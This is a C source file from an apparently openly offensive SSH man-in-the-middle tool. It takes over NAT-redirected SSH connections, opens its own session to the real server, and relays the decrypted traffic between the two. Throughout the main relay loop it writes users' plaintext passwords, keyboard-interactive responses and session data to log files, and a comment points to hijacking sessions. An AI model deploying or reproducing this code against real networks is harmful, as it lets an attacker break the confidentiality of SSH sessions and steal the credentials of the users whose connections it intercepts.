#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <time.h>
#include <sys/signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <termios.h>
#include <pwd.h>
#include <openssl/err.h>

#ifndef __dead
#define __dead	   __attribute__((noreturn))
#endif

#include "canohost.h"
#include "entropy.h"
#include "ssh.h"
#include "ssh1.h"
#include "ssh2.h"
#include "log.h"
#include "kex.h"
#include "compat.h"
#include "packet.h"
#include "readconf.h"
#include "sshconnect.h"
#include "channels.h"
#include "pathnames.h"
#include "authfile.h"
#include "xmalloc.h"
#include "servconf.h"

#include "mitm-ssh.h"

#define SUPER_MAX_PACKET_SIZE	(1024*1024)


/* Transfers packet data between processes */
struct simple_packet {
	u_int type;
	u_int len;
	char data[SUPER_MAX_PACKET_SIZE+12];
};


/* Flag a connection to the real target */
volatile int target_connected = 0;


/* Local routines */
static const char *str_time(time_t, const char *);
void target_connect(u_int, u_short, int, u_int);
static ssize_t writen(int, void *, size_t);
static ssize_t readn(int, void *, size_t);
static int process_packet(int, char *);
static int ssh1_process_packet(int, char *);
static int ssh2_process_packet(int, char *);
static int packet_read_next(int);


/* Global variables */
extern struct mitm_ssh_opts mopt;
extern u_int max_packet_size;
extern ServerOptions options;

#define LINUX24

#ifdef FREEBSD
#define LINUX22
#endif

/*
 * Get the real target of a spoofed/NATed client
 * Returns -1 on error or if no real target was found,
 * 0 on success with dst set to the target.
 */
int 
get_real_target(int sock, struct sockaddr_in *tgt)
{
	socklen_t addrlen;
	addrlen = sizeof(struct sockaddr_in);

#ifdef LINUX22
	if (getsockname(sock, (struct sockaddr*)tgt, &addrlen) < 0) {
		logit("** Error: getsockname: %s", strerror(errno));
		return(-1);
	}

#elif defined(LINUX24)
#include "netfilter.h"
	if (getsockopt(sock, SOL_IP, SO_ORIGINAL_DST, tgt, &addrlen) < 0) {
		logit("** Error: getsockopt: %s", strerror(errno));
		return(-1);
	}

#else
#error "Real destination through socket options not supported on this OS"
#endif


	/* Avoid loops (clients connecting back to us again) */
	if ( (tgt->sin_addr.s_addr == net_inetaddr(get_local_ipaddr(sock))) &&
			(tgt->sin_port == htons(get_local_port())) ) {
		logit("[MITM] Loop detected when resolving real target, "
			"refusing to connect client back to me again!");
		memset(tgt, 0x00, addrlen);
		return(-1);	
	}


	logit("[MITM] Found real target %s for NAT host %s:%u", 
		net_sockstr(tgt, mopt.resolve), get_remote_ipaddr(), get_remote_port());
	return(0);
}


/*
 * Read data available from descriptor.
 * Returns the type of the packet if a packet is
 * available, SSH_MSG_NONE otherwise.
 */
static int
packet_read_next(int fd)
{
	char buf[1024*1024];
	ssize_t n;
	int type;

	debug4("[MITM] Reading next packet");
	if ( (type = packet_read_poll()) != SSH_MSG_NONE) {
		debug4("[MITM] Next packet was in buffer");
		return(type);
	}
	
	n = read(fd, buf, sizeof(buf));

	if (n == 0) {
		packet_close();
		fatal("[MITM] Connection from %s:%u closed",
			get_local_ipaddr(fd), get_remote_port());
	}
	
	if (n < 0) {
		if (errno == EAGAIN) {
			debug4("[MITM] Packet read would block");
			return(SSH_MSG_NONE);
		}
		
		fatal("Network error");
	}

	packet_process_incoming(buf, n);
	return(packet_read_poll());
}


/*  
 * Convert time given in seconds to a string.
 * If fmt is NULL, time is given as 'year-month-day hour:min:sec'
 * Returns a pointer to the time string on succes, NULL on error
 * with errno set to indicate the error.
 */	
static const char *
str_time(time_t caltime, const char *fmt)
{
	static char tstr[256];
	struct tm *tm;
 
	if (fmt == NULL) 
		fmt = "%Y-%m-%d %H:%M:%S"; 
	
	memset(tstr, 0x00, sizeof(tstr));
 
	if ( (tm = localtime(&caltime)) == NULL)
		return(NULL);
 
	if (strftime(tstr, sizeof(tstr) -1, fmt, tm) == 0)
		return(NULL);

	return(tstr);
}


/*  
 * Write N bytes to a file descriptor 
 */ 
static ssize_t
writen(int fd, void *buf, size_t n)
{
	size_t tot = 0;
	ssize_t w;
	do { 
		if ( (w = write(fd, (void *)((u_char *)buf + tot), n - tot)) <= 0)
			return(w);
		tot += w;
	} while (tot < n);
	return(tot);
}


/*
 * Read N bytes from a file descriptor
 */
static ssize_t
readn(int fd, void *buf, size_t n)
{
	size_t tot = 0;
	ssize_t r;
	do {
		if ( (r = read(fd, (void *)((u_char *)buf + tot), n - tot)) <= 0)
			return(r);
		tot += r;
	} while (tot < n);
	return(tot);
}


/*
 * Terminate process when child exits or flag connection to target
 */
static void
sighandler(int signo)
{
	if (signo == SIGCHLD) {
		debug("Child terminated connection");
		wait(NULL);
		exit(EXIT_SUCCESS);
	}

	else if (signo == SIGUSR1) {
		debug("[MITM] Connection to real target established");
		target_connected = 1;
		signal(SIGUSR1, SIG_DFL);
	}
	else
		logit("** Unrecognized signal %u", signo);
}


/*
 * Check for packets that do not need to be redirected
 */
static int
process_packet(int type, char *raw)
{
	if (compat20)
		return(ssh2_process_packet(type, raw));
	else
		return(ssh1_process_packet(type, raw));
}

static int
ssh1_process_packet(int type, char *raw)
{
	int processed = 0;
	int success = 0;
	int compression_level = 0;
	int enable_compression_after_reply = 0;

	switch (type) {
		case SSH_CMSG_REQUEST_COMPRESSION:
			processed = 1;

			debug2("Got SSH_CMSG_REQUEST_COMPRESSION");
			compression_level = *((int *)(raw + 4));
			if (compression_level < 1 || compression_level > 9) {
				packet_send_debug("Received invalid compression level %d.",
					compression_level);
				break;
			}

			/* Enable compression after we have responded with SUCCESS. */
			enable_compression_after_reply = 1;
			success = 1;
			break;	
		
		case SSH_CMSG_MAX_PACKET_SIZE:
			debug2("Got SSH_CMSG_MAX_PACKET_SIZE");
			processed = 1;
			if (packet_set_maxsize(*((int *)(raw + 4))) > 0)	
				success = 1;
			break;
	
		/* 
		 * We may want to handle this when hijacking
		 * case SSH_CMSG_EXIT_CONFIRMATION:
		 *	debug2("Got SSH_CMSG_EXIT_CONFIRMATION");
		 *	fatal("Closing connection");
		 *	break;
		 */

	}

	if (processed) {
		debug3("Process %s", success ? "failed" : "succeded");
		packet_start(success ? SSH_SMSG_SUCCESS : SSH_SMSG_FAILURE);
		packet_send();
		packet_write_poll();

		/* Enable compression now that we have replied if appropriate. */
		if (enable_compression_after_reply) {
			enable_compression_after_reply = 0;
			packet_start_compression(compression_level);
			debug3("Compression enabled");
		}
	}
	
	return(processed);
}

static int
ssh2_process_packet(int type, char *raw)
{
	/* There is really not much to do with a SSH2 packet since
	 * important stuff like compression is handled by packet.c. */
	return(0);
}



/*
 * Do the MITM
 * We fork and let the child connect to the real target
 * and use a socketpair to send the decrypted data to be transfered
 * between the endpoints.
 * ip and port for route in network byte order.
 */
void 
mitm_ssh(int cfd)
{
	struct sockaddr_in tgt;
	int sp[2];
	pid_t pid;
	fd_set readset;
	size_t nfd;
	int sock_in, sock_out;
	u_int ssh_proto;
	struct simple_packet spkt;
	ssize_t n;
	int src_data = 0;
	int dst_data = 0;
	FILE *logf = NULL;
	char *cstr;
	char *sstr;
	char buf[4096];
	int log_info_response = 0;
	char *info_response_user = NULL;
	
	sock_in = sock_out = cfd;
	ssh_proto = compat20 ? SSH_PROTO_2 : SSH_PROTO_1;
	
	signal(SIGCHLD, sighandler);
	signal(SIGUSR1, sighandler);

	/* Static route */
	memset(&tgt, 0x00, sizeof(tgt));
	
	/* Get real target or use static route */
	if (get_real_target(cfd, &tgt) != 0) {
		tgt.sin_addr.s_addr = mopt.r_addr;
		tgt.sin_port = mopt.r_port;
	}

	if (tgt.sin_addr.s_addr == 0) 
		fatal("Failed to get route for client");

	logit("[MITM] Routing %s %s:%u -> %s", 
		compat20 ? "SSH2" : "SSH1", get_remote_ipaddr(),
		get_remote_port(), net_sockstr(&tgt, 0));

	/* Set up the unencrypted data channel to the client */
	if (socketpair(AF_LOCAL, SOCK_STREAM, 0, sp) < 0) 
		fatal("socketpair failed: %s", strerror(errno));

	/* Fork off the child that connects to the real target */
	if ( (pid = fork()) < 0) 
		fatal("fork: %s\n", strerror(errno));

	if (pid == 0) {
		/* Close the unused socket */
		close(sp[0]);
		signal(SIGUSR1, SIG_DFL);
	
		target_connect(tgt.sin_addr.s_addr, tgt.sin_port, sp[1], ssh_proto);
		
		/* Unreached */
		exit(EXIT_FAILURE);
	}
	
	/* Close the unused socket */
	close(sp[1]);

	/* Wait for a signal telling us that the connection 
	 * is established or terminated. */
	while(target_connected == 0)
			pause();

	cstr = strdup(net_sockstr_ip(net_inetaddr(get_remote_ipaddr()), 
		htons(get_remote_port()), mopt.resolve));
	sstr = strdup(net_sockstr(&tgt, mopt.resolve));
	
	/* Open client -> server log */
	if (options.c_logdir != NULL) {
		snprintf(buf, sizeof(buf), "%s/%s %s -> %s", options.c_logdir, 
			compat20 ? "ssh2" : "ssh1", cstr, sstr);
		if ( (src_data = open(buf, O_RDWR|O_APPEND|O_CREAT, 0600)) < 0)
			error("Failed to open logfile '%s': %s", buf, strerror(errno));
	}

	/* Open server -> client log */
	if (options.s_logdir != NULL) {
		snprintf(buf, sizeof(buf), "%s/%s %s <- %s", options.s_logdir, 
			compat20 ? "ssh2" : "ssh1", cstr, sstr);
		if ( (dst_data = open(buf, O_RDWR|O_APPEND|O_CREAT, 0600)) < 0)
			error("Failed to open logfile '%s'", buf);
	}

	/* Open passwd log */
	if (options.passwdlog != NULL) {
		if ( (logf = fopen(options.passwdlog, "a")) == NULL)
			error("Failed to open password logfile '%s': %s", 
				options.passwdlog, strerror(errno));
	}
	
	packet_set_interactive(0);

	/* Do the MITM thingy */
	FD_ZERO(&readset);
	FD_SET(cfd, &readset);
	FD_SET(sp[0], &readset);

	/* Max file descriptor */
	nfd = (cfd > sp[0] ? cfd : sp[0]) +1;
	
	memset(&spkt, 0x00, sizeof(spkt));
	for (;;) {
		char *pt;
		
		fd_set readtmp;
		memcpy(&readtmp, &readset, sizeof(readtmp));


		debug4("[MITM] Selecting on server side");
		if (select(nfd, &readtmp, NULL, NULL, NULL) < 0) {
			if (errno == EINTR)
				continue;
			break;
		}

		/* Read from client and write to socketpair */
		if (FD_ISSET(cfd, &readtmp)) {
			
			debug4("[MITM] Reading from client on server side");
			while ( (spkt.type = packet_read_next(cfd)) != SSH_MSG_NONE) {
				pt = (char *)packet_get_raw((int *)&spkt.len);

				/* Do not send along packets that only affect us */
				if (process_packet(spkt.type, spkt.data) != 0) {
					memset(&spkt, 0x00, spkt.len+8);
					continue;
				}
			
				if (spkt.len > sizeof(spkt.data)) {
					fatal("** Darn, buffer to small (%u) for received packet (%u)\n",
						spkt.len, sizeof(spkt.data));
				}
			
				debug3("[MITM] Got %u bytes from client [type %u]", spkt.len, spkt.type);
				memcpy(spkt.data, pt, spkt.len);

				if (writen(sp[0], &spkt, spkt.len+8) != spkt.len+8)
					break;
			
				/* Log SSH2 data */
				if (compat20) {
					
					if (spkt.type == SSH2_MSG_USERAUTH_REQUEST) {
						char *user = packet_get_string(NULL);
						char *service = packet_get_string(NULL);
						char *method = packet_get_string(NULL);
						
						debug2("[MITM] %s -> %s SSH2_MSG_USERAUTH_REQUEST: %s %s %s", 
							cstr, sstr, user, service, method);
						
						if (strcmp(method, "password") == 0) {	
							char c = packet_get_char();
							char *pass = packet_get_string(NULL);
							
							snprintf(buf, sizeof(buf), "[%s] MITM (SSH2) %s -> %s\n"
								"SSH2_MSG_USERAUTH_REQUEST: %s %s %s %d %s\n",
								str_time(time(NULL), NULL), cstr, sstr, 
								user, service, method, c, pass);
							logit("\n%s", buf);
							if (logf != NULL) {
								fprintf(logf, "%s\n", buf);
								fflush(logf);
							}
						}

						if (strcmp(method, "keyboard-interactive") == 0) {
							log_info_response = 1;
							info_response_user = strdup(user);
						}
					}
					else if (log_info_response && spkt.type == SSH2_MSG_USERAUTH_INFO_RESPONSE) {
						u_int a = packet_get_int();
						char *pass = packet_get_string(NULL);

						snprintf(buf, sizeof(buf), "[%s] MITM (SSH2) %s -> %s\n"
							"SSH2_MSG_USERAUTH_INFO_RESPONSE: (%s) %s\n",
							str_time(time(NULL), NULL), cstr, sstr,
							info_response_user, pass);

						logit("\n%s", buf);
						if (logf != NULL) {
							fprintf(logf, "%s\n", buf);
							fflush(logf);
						}
						log_info_response = 0;
						if (info_response_user) {
							free(info_response_user);
							info_response_user = NULL;
						}
					}

					else if (spkt.type == SSH2_MSG_CHANNEL_DATA) {
						if ((src_data > 0) && (spkt.len >= 8)) 
							writen(src_data, &spkt.data[8], spkt.len-8);
					}
				}
				/* Log SSH1 data */
				else {
				
					if ((spkt.type == SSH_CMSG_STDIN_DATA) ||
						(spkt.type == SSH_SMSG_STDOUT_DATA) ||
						(spkt.type == SSH_SMSG_STDERR_DATA)) {
							if (src_data > 0)
								writen(src_data, &spkt.data[4], spkt.len-4);
					}
					else if (spkt.type == SSH_CMSG_USER) {
						snprintf(buf, sizeof(buf), "[%s] MITM (SSH1) %s -> %s"
							"\nSSH_CMSG_USER: %s\n", str_time(time(NULL), NULL), 
							cstr, sstr, &spkt.data[4]);
						logit("\n%s", buf);
						if (logf != NULL) {
							fprintf(logf, "%s\n", buf);
							fflush(logf);
						}
					}
					else if (spkt.type == SSH_CMSG_AUTH_PASSWORD) {
						snprintf(buf, sizeof(buf), "[%s] MITM (SSH1) %s -> %s"
							"\nSSH_CMSG_AUTH_PASSWORD: %s\n", str_time(time(NULL), 
							NULL), cstr, sstr, &spkt.data[4]);
						logit("\n%s", buf);
						if (logf != NULL) {
							fprintf(logf, "%s\n", buf);
							fflush(logf);
						}
					}
				}
				memset(&spkt, 0x00, spkt.len+8);
			}
		}

		/* Read from socketpair and write to client */
		if (FD_ISSET(sp[0], &readtmp)) {

			debug4("[MITM] Reading spkt header on server side");
			if ( (n = readn(sp[0], &spkt, 8)) <= 0)
				break;

			if (spkt.len > sizeof(spkt.data)) {
				fatal("** Darn, buffer to small (%u) for received packet (%u)\n",
					spkt.len, sizeof(spkt.data));
			}

			debug4("[MITM] Reading %u bytes from socketpair on server side", spkt.len);
			if (spkt.len && (n = readn(sp[0], spkt.data, spkt.len)) <= 0)
				break;

			debug3("[MITM] Got %u bytes from child process", spkt.len);
			packet_start(spkt.type);
			packet_put_raw(spkt.data, spkt.len);
			packet_send();
			packet_write_wait();
			
			/* Log SSH2 data 
			 * TODO: No need to log data that won't appear here */
			if (compat20) {
				if (spkt.type == SSH2_MSG_USERAUTH_REQUEST) {
					char *user = packet_get_string(NULL);
					char *service = packet_get_string(NULL);
					char *method = packet_get_string(NULL);
						
					if (strcmp(method, "password") == 0) {	
						char c = packet_get_char();
						char *pass = packet_get_string(NULL);
							
						snprintf(buf, sizeof(buf), "[%s] MITM (SSH2) %s -> %s\n"
							"SSH2_MSG_USERAUTH_REQUEST: %s %s %s %d %s\n",
							str_time(time(NULL), NULL), cstr, sstr, 
							user, service, method, c, pass);
						logit("\n%s", buf);
						if (logf != NULL) {
							fprintf(logf, "%s\n", buf);
							fflush(logf);
						}
					}
				}
				else if (spkt.type == SSH2_MSG_CHANNEL_DATA) {
					if ((dst_data > 0) && (spkt.len >= 8))	
						writen(dst_data, &spkt.data[8], spkt.len-8);
				}
			}
			/* Log SSH1 data 
			 * TODO: No need to log data that won't appear here */
			else {
				if ((spkt.type == SSH_CMSG_STDIN_DATA) ||
					(spkt.type == SSH_SMSG_STDOUT_DATA) ||
					(spkt.type == SSH_SMSG_STDERR_DATA)) {
						if ((dst_data > 0) && (spkt.len >= 4)) 
							writen(dst_data, &spkt.data[4], spkt.len-4);
				}
				else if (spkt.type == SSH_CMSG_USER) {
				   snprintf(buf, sizeof(buf), "[%s] MITM (SSH1) %s -> %s"
						"\nSSH_CMSG_USER: %s", str_time(time(NULL), NULL), 
						sstr, cstr, &spkt.data[4]);
					logit("%s", buf);
					if (logf) {
						fprintf(logf, "%s\n\n", buf);
						fflush(logf);
					}
				}
				else if (spkt.type == SSH_CMSG_AUTH_PASSWORD) {
					snprintf(buf, sizeof(buf), "[%s] MITM (SSH1) %s -> %s"
						"\nSSH_CMSG_AUTH_PASSWORD: %s", str_time(time(NULL), NULL), 
						sstr, cstr, &spkt.data[4]);
					logit("%s", buf);
					if (logf) {
						fprintf(logf, "%s\n\n", buf);
						fflush(logf);
					}
				}
			}
			
			memset(&spkt, 0x00, spkt.len+8);
		}
	}

	/* If the spoofed client decided to shut down the connection, this is
	 * a great place for hijacking :-) */

	if (errno && n)
		logit("** Error: %s\n", strerror(errno));

	packet_close();
	kill(SIGTERM, pid);
	wait(NULL);

	if (src_data > 0)
		close(src_data);
	if (dst_data > 0)
		close(dst_data);
	if (logf)
		fclose(logf);
	
	exit(errno ? EXIT_FAILURE : EXIT_SUCCESS);
}

uid_t original_real_uid;
uid_t original_effective_uid;
pid_t proxy_command_pid;
Options client_options;

/*
 * Connect to the real target
 * IP and port in network byte order.
 */
void
target_connect(u_int ip, u_short port, int sp, u_int ssh_proto) 
{
	struct sockaddr_storage hostaddr;
	struct sockaddr_in tin;
	struct simple_packet spkt;
	char target_host[48];
	int sock;
	fd_set readset;
	size_t nfd;
	ssize_t n;
	
	tin.sin_addr.s_addr = ip;
	snprintf(target_host, sizeof(target_host), "%s", inet_ntoa(tin.sin_addr));
	
	debug2("[MITM] Connecting to real target (%s %s:%u)", 
		ssh_proto == SSH_PROTO_2 ? "SSH2" : "SSH1",
		target_host, ntohs(port));

	init_rng();
	original_real_uid = getuid();
	original_effective_uid = geteuid();
	
	/* Init options */
	initialize_options(&client_options);
	client_options.protocol = ssh_proto;
	client_options.address_family = AF_INET;
	client_options.cipher = -1;

	/* Fill configuration defaults. */
	fill_default_options(&client_options);

	SSLeay_add_all_algorithms();
	ERR_load_crypto_strings();

	channel_set_af(client_options.address_family);
	seed_rng();

	if (ssh_connect(target_host, &hostaddr, htons(port), 
			client_options.address_family, client_options.connection_attempts, 
			client_options.use_privileged_port, NULL) != 0) 
		fatal("** Error: SSH connection to real target failed\n");

	/* Exchange protocol version identification strings with the server. */
	ssh_exchange_identification();

	/* Put the connection into non-blocking mode. */
	packet_set_nonblocking();

	/* Exchange keys */
	if (compat20) 
		ssh_kex2(target_host, (struct sockaddr *)&hostaddr);
	else 
		ssh_kex(target_host, (struct sockaddr *)&hostaddr);

	/* Signal connection to parent */
	kill(getppid(), SIGUSR1);
	
	/* Get the connected socket */
	sock = packet_get_connection_in();
	packet_set_interactive(0);
	
	FD_ZERO(&readset);
	FD_SET(sock, &readset);
	FD_SET(sp, &readset);

	/* Max file descriptor */
	nfd = (sp > sock ? sp : sock) +1;

	memset(&spkt, 0x00, sizeof(spkt));
	for (;;) {
		fd_set readtmp;
		char *pt;
		
		memcpy(&readtmp, &readset, sizeof(readtmp));

		debug4("[MITM] Selecting on client side");
		if (select(nfd, &readtmp, NULL, NULL, NULL) < 0) {
			if (errno == EINTR)
				continue;
			break;
		}
		
		/* Read from socketpair and write to client */
		if (FD_ISSET(sp, &readtmp)) {
			
			debug4("[MITM] Reading spkt header on client side");
			if ( (n = readn(sp, &spkt, 8)) <= 0)
				break;
			
			if (spkt.len > sizeof(spkt.data)) {
				fatal("** Darn, buffer to small (%u) for received packet (%u)\n",
					spkt.len, sizeof(spkt.data));
			}

			debug3("[MITM] Got %u bytes from server process", spkt.len);
			if ( spkt.len && (n = readn(sp, spkt.data, spkt.len)) <= 0)
				break;

			packet_start(spkt.type);
			packet_put_raw(spkt.data, spkt.len);
			packet_send();
			packet_write_wait();
			memset(&spkt, 0x00, spkt.len+8);
		}

		/* Read from target and write to socketpair */
		if (FD_ISSET(sock, &readtmp)) {

			debug4("[MITM] Reading from client on client side");
			while ( (spkt.type = packet_read_next(sock)) != SSH_MSG_NONE) {
				pt = packet_get_raw(&spkt.len);

				/* Do not send along packets that only affect us */
				if (process_packet(spkt.type, spkt.data) != 0) {
					memset(&spkt, 0x00, spkt.len+8);
					continue;
				}

				if (spkt.len > sizeof(spkt.data)) {
					fatal("** Darn, buffer to small (%u) for received packet (%u)\n",
						spkt.len, sizeof(spkt.data));
				}

				memcpy(spkt.data, pt, spkt.len);
				debug3("[MITM] Got %u bytes from target [type %u]", spkt.len, spkt.type);

				if (writen(sp, &spkt, spkt.len+8) != spkt.len+8)
					break;
				memset(&spkt, 0x00, spkt.len+8);
			}
		}
	}
	
	if (errno && n)
		logit("** Error: %s\n", strerror(errno));

	packet_close();
	exit(errno ? EXIT_FAILURE : EXIT_SUCCESS);
}
